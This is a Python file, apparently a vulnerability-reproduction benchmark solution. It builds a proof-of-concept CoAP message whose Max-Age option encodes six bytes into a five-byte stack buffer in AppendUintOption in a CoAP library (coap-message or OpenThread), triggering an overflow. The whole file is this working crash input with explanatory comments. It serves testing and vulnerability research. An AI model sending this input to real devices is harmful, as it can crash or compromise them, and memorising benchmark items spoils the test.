import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a stack buffer overflow in AppendUintOption within the coap-message library (or OpenThread).
        The function uses a small stack buffer (typically 5 bytes) to encode the option.
        Encoding a CoAP Option with Delta >= 13 and a 4-byte value requires:
        - 1 byte for Option Header (Delta nibble 13, Length nibble 4)
        - 1 byte for Extended Delta (Delta - 13)
        - 4 bytes for the Value
        Total: 6 bytes.
        Writing 6 bytes into a 5-byte buffer triggers the overflow/sanitizer error.
        
        We construct a minimal valid CoAP message with Option 14 (Max-Age), which is a Uint option.
        """
        
        # CoAP Header:
        # Ver = 1 (2 bits) -> 01
        # Type = CON (0) (2 bits) -> 00
        # TKL = 0 (4 bits) -> 0000
        # Byte 0: 01000000 -> 0x40
        # Code = GET (1) -> 0x01
        # Message ID = 0x0001
        header = b'\x40\x01\x00\x01'
        
        # Option 14 (Max-Age)
        # We need Delta = 14.
        # CoAP Delta encoding for 13-268:
        #   First nibble = 13 (0xD)
        #   Followed by 1 byte (Extended Delta) = Actual Delta - 13
        #   14 - 13 = 1 (0x01)
        # Length = 4 (for uint32 max value) -> 0x4
        #
        # Option Header Byte: (0xD << 4) | 0x4 = 0xD4
        # Extended Delta Byte: 0x01
        # Value (4 bytes): 0xFFFFFFFF
        
        # This creates a 6-byte sequence for the option.
        option = b'\xD4\x01\xFF\xFF\xFF\xFF'
        
        return header + option
